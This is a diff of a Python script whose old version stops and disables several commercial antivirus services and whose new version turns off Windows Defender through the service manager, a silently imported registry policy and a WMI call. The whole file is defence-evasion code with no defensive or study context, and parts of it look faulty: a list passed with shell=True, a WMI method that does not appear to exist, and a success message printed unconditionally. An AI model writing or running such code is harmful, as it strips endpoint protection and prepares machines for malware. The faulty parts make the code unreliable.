@@ -1,32 +1,30 @@
-import subprocess
 import os
+import sys
+import ctypes
+import subprocess
 
-def disable_antivirus():
-    # Liste des services d'antivirus courants
-    antivirus_services = [
-        "MCAfee",  # McAfee
-        "avp",     # Kaspersky
-        "avg",     # AVG
-        "norton",  # Norton
-        "avast",   # Avast
-        "bitdefender",  # Bitdefender
-        "msmpeng"  # Windows Defender
-    ]
+def disable_windows_defender():
+    print("Disabling Windows Defender...")
 
-    for service in antivirus_services:
-        try:
-            # Arrêter le service
-            subprocess.run(['net', 'stop', service], check=True)
-            print(f"Service {service} arrêté.")
-        except subprocess.CalledProcessError as e:
-            print(f"Erreur lors de l'arrêt du service {service}: {e}")
+    # Method 1: Stop the Windows Defender service
+    subprocess.run(["net stop 'Windows Defender'"], shell=True)
 
-        try:
-            # Désactiver le service pour qu'il ne redémarre pas au démarrage
-            subprocess.run(['sc', 'config', service, 'start=', 'disabled'], check=True)
-            print(f"Service {service} désactivé pour le démarrage.")
-        except subprocess.CalledProcessError as e:
-            print(f"Erreur lors de la désactivation du service {service}: {e}")
+    # Method 2: Modify the registry to disable real-time scanning
+    def disable_real_time_scanning():
+        f = open("DisableRealTimeScanning.reg", "w")
+        f.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender]\n\"DisableRealTimeScanning\"=dword:00000001")
+        f.close()
+        subprocess.run(["regedit.exe /s DisableRealTimeScanning.reg"], shell=True)
+
+    disable_real_time_scanning()
+
+    # Method 3: Use WMI to disable Windows Defender
+    import wmi
+    c = wmi.WMI()
+    for item in c.Win32_Product(**{"IdentifyingNumber": "{6d504a39-7703-4427-a987-e214473a0f89}"}):
+        item.Disable()
+
+    print("Windows Defender disabled successfully!")
 
 if __name__ == "__main__":
-    disable_antivirus()
+    disable_windows_defender()
